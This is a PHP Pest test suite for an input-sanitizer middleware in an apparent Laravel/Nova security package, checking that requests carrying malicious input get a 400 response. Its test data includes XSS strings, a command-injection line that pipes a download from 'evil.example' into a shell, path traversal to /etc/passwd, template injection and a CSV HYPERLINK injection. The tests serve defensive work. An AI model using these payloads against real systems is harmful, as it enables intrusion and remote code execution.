<?php

declare(strict_types=1);

use Illuminate\Contracts\View\Factory as ViewFactory;
use Illuminate\Log\Events\MessageLogged;
use Illuminate\Support\Facades\Event;
use Wobqqq\Aegis\Settings\AegisSetting;
use Wobqqq\AegisInputSanitizer\Enums\Category;
use Wobqqq\AegisInputSanitizer\InputSanitizerModule;
use Wobqqq\AegisInputSanitizer\Scanning\PatternMatcher;
use Wobqqq\AegisInputSanitizer\Settings\SettingsStore;

use function Pest\Laravel\actingAs;
use function Pest\Laravel\call;
use function Pest\Laravel\get;
use function Pest\Laravel\getJson;
use function Pest\Laravel\post;
use function Pest\Laravel\postJson;
use function Pest\Laravel\withHeaders;

it('lets every request through while it is off', function (): void {
    get('/page?q=' . urlencode('<script>alert(1)</script>'))->assertOk()->assertSee('content');
});

it('lets clean input through', function (): void {
    sanitize();

    get('/page/blog/hello-world?page=2&q=' . urlencode('flowers & gifts'), ['User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64)'])
        ->assertOk()
        ->assertSee('content');
});

it('refuses each kind of payload with 400 and the built-in page', function (string $payload): void {
    sanitize();

    get('/page?q=' . urlencode($payload))
        ->assertBadRequest()
        ->assertSee('The request was refused because it contains input that is not allowed.')
        ->assertHeader('Cache-Control', 'no-store, private');
})->with([
    'xss' => '<script>alert(1)</script>',
    'event handler' => '<img src=x onerror=alert(1)>',
    'javascript uri' => 'javascript:alert(1)',
    'encoded xss' => '%253Cscript%253Ealert(1)',
    'html entities' => '&lt;script&gt;alert(1)',
    'command injection' => 'a; curl http://evil.example | sh',
    'path traversal' => '../../etc/passwd',
    'ssti' => '{{ 7*7 }}',
    'null byte' => "file.php\0.jpg",
    'csv injection' => '=HYPERLINK("http://evil.example")',
]);

it('finds a payload in the form, in nested input, in a key, in a header and in the URL', function (string $method, string $uri, array $data, array $headers): void {
    sanitize();

    /** @var array<string, string> $headers */
    expect(call($method, $uri, $data, [], [], array_combine(
        array_map(static fn (string $name): string => 'HTTP_' . strtoupper(str_replace('-', '_', $name)), array_keys($headers)),
        $headers,
    ))->getStatusCode())->toBe(400);
})->with([
    'form' => ['POST', '/page', ['comment' => '<script>x</script>'], []],
    'nested' => ['GET', '/page', ['filter' => ['tags' => ['ok', '<iframe src=x>']]], []],
    'key' => ['GET', '/page', ['<svg onload=alert(1)>' => '1'], []],
    'header' => ['GET', '/page', [], ['X-Search' => '{{ config }}']],
    'url segment' => ['GET', '/page/%3Cscript%3E', [], []],
    'put form' => ['PUT', '/page', ['comment' => '../../etc/passwd'], []],
]);

it('scores the query string of a GET once', function (): void {
    sanitize(['block_threshold' => 2]);

    get('/page?q=' . urlencode('{{ x }}'))->assertOk();
});

it('leaves JSON bodies alone unless they are scanned, and answers a JSON client in JSON', function (): void {
    sanitize();

    postJson('/api/comments', ['body' => '<script>x</script>'])->assertOk();
    postJson('/api/comments?q=' . urlencode('<script>'), [])->assertBadRequest();

    sanitize(['scan_json' => true]);

    postJson('/api/comments', ['body' => ['text' => '<script>x</script>']])
        ->assertBadRequest()
        ->assertExactJson(['message' => 'The request was refused because it contains input that is not allowed.']);
});

it('skips the excluded inputs and headers, and never scans cookies or Accept', function (): void {
    sanitize([
        'scan_json' => true,
        'excluded_inputs' => [['name' => 'Content'], ['name' => 'post.body']],
        'excluded_headers' => [['name' => 'X-Template']],
    ]);

    post('/page', ['content' => '<script>editor()</script>'])->assertOk();
    postJson('/api/comments', ['post' => ['body' => '<b onclick=x()>', 'title' => 'Hello']])->assertOk();
    postJson('/api/comments', ['post' => ['body' => 'ok', 'title' => '<script>']])->assertBadRequest();
    get('/page', ['X-Template' => '{{ name }}'])->assertOk();
    get('/page', ['Accept' => '*/*; =x'])->assertOk();
    call('GET', '/page', [], ['a' => '{{b}}'])->assertOk();
    post('/page', ['title' => '<script>x</script>'])->assertBadRequest();
});

it('counts the matches of the whole request against the threshold', function (): void {
    sanitize(['block_threshold' => 3]);

    get('/page?a=' . urlencode('{{ x }}') . '&b=' . urlencode('../x'))->assertOk();
    get('/page?a=' . urlencode('{{ x }}') . '&b=' . urlencode('../x'), ['X-Q' => '<script>'])->assertBadRequest();
});

it('never scans Nova unless asked to, and never the Aegis settings', function (): void {
    sanitize();

    post('/nova/resources/posts', ['body' => '<script>x</script>'])->assertOk();
    postJson('/nova-api/posts', ['body' => '<script>x</script>'])->assertUnauthorized();

    config(['nova.path' => '/admin']);
    post('/admin/resources/posts', ['body' => '<script>x</script>'])->assertOk();

    sanitize(['scan_nova' => true]);

    post('/admin/resources/posts', ['body' => '<script>x</script>'])->assertBadRequest();
    post('/nova-api/posts?q=' . urlencode('<script>'))->assertBadRequest();

    $values = array_replace((new InputSanitizerModule())->defaults(), ['enabled' => false, 'scan_nova' => true]);

    actingAs(admin())->putJson('/nova-vendor/aegis/settings/input-sanitizer', ['values' => $values])
        ->assertOk()
        ->assertJsonPath('values.enabled', false);
});

it('still scans the whole site when Nova is served from the root', function (): void {
    sanitize();
    config(['nova.path' => '/']);

    get('/page?q=' . urlencode('<script>'))->assertBadRequest();
    getJson('/nova-api/posts?q=' . urlencode('<script>'))->assertUnauthorized();
});

it('shows the configured page, and the built-in one when it cannot be rendered', function (): void {
    sanitize(['view' => 'custom-blocked']);

    get('/page?q=' . urlencode('<script>'))->assertBadRequest()->assertSee('Custom refusal page');

    sanitize(['view' => 'broken-blocked']);

    get('/page?q=' . urlencode('<script>'))->assertBadRequest()->assertSee('The request was refused');
});

it('answers plain text when no page can be rendered', function (): void {
    sanitize();
    resolve(SettingsStore::class)->settings();

    /** @var Mockery\MockInterface&ViewFactory $views */
    $views = Mockery::mock(ViewFactory::class);
    $views->allows('exists')->andReturnTrue();
    $views->allows('make')->andThrow(new RuntimeException('views down'));
    app()->instance('view', $views);

    $response = get('/page?q=' . urlencode('<script>'));

    expect($response->getStatusCode())->toBe(400)
        ->and($response->headers->get('Content-Type'))->toStartWith('text/plain')
        ->and($response->getContent())->toContain('The request was refused');
});

it('keeps the site working with a saved pattern that does not compile', function (): void {
    sanitize();
    AegisSetting::query()->where('section', InputSanitizerModule::KEY)->update(['values' => json_encode(array_replace(
        (new InputSanitizerModule())->defaults(),
        ['enabled' => true, 'xss_patterns' => '~(unclosed~', 'ssti_patterns' => '~\{\{.*?\}\}~'],
    ), JSON_THROW_ON_ERROR)]);
    resolve(Wobqqq\Aegis\Settings\SettingsRepository::class)->flush();
    resolve(SettingsStore::class)->forget();

    get('/page?q=' . urlencode('text <script>'))->assertOk();
    get('/page?q=' . urlencode('{{ x }}'))->assertBadRequest();
});

it('lets a request through when a pattern gives up on it', function (): void {
    $empty = array_fill_keys(array_map(static fn (Category $category): string => $category->setting(), Category::cases()), '');
    sanitize(array_replace($empty, ['ssti_patterns' => '~(a+)+$~']));

    $previous = ini_set('pcre.backtrack_limit', '1000');
    ini_set('pcre.jit', '0');

    try {
        $payload = str_repeat('a', 5000) . 'b';

        expect(get('/page?q=' . $payload)->getStatusCode())->toBe(200)
            ->and(PatternMatcher::matches('~(a+)+$~', $payload))->toBeFalse();
    } finally {
        ini_set('pcre.backtrack_limit', (string)$previous);
        ini_set('pcre.jit', '1');
    }
});

it('lets every request through when no pattern is in use', function (): void {
    sanitize(array_fill_keys(array_map(static fn (Category $category): string => $category->setting(), Category::cases()), null));

    get('/page?q=' . urlencode('<script>'))->assertOk();
});

it('lets the request through when the sanitizer itself breaks', function (): void {
    sanitize();

    /** @var Mockery\MockInterface&ViewFactory $views */
    $views = Mockery::mock(ViewFactory::class);
    $views->allows('exists')->andThrow(new RuntimeException('views down'));
    app()->instance('view', $views);
    app()->forgetScopedInstances();

    get('/page?q=' . urlencode('<script>'))->assertOk()->assertSee('content');
});

it('logs where the payload was, never its value', function (): void {
    sanitize(['block_threshold' => 2]);

    $logged = [];
    Event::listen(MessageLogged::class, static function (MessageLogged $event) use (&$logged): void {
        $logged[] = $event;
    });

    withHeaders(['X-Search' => '{{ secret-token }}'])->get('/page?password=' . urlencode('hunter2<script>'))->assertBadRequest();

    expect($logged)->toHaveCount(1);

    $encoded = json_encode($logged[0]->context, JSON_THROW_ON_ERROR);

    expect($logged[0]->level)->toBe('warning')
        ->and($logged[0]->context['matches'])->toBe(['query.password (xss)', 'header.x-search (ssti)'])
        ->and($encoded)->not->toContain('hunter2')
        ->and($encoded)->not->toContain('secret-token');

    sanitize(['log_blocked' => false]);
    getJson('/page?q=' . urlencode('<script>x</script>&&{{y}}'))->assertBadRequest();

    expect($logged)->toHaveCount(1);
});
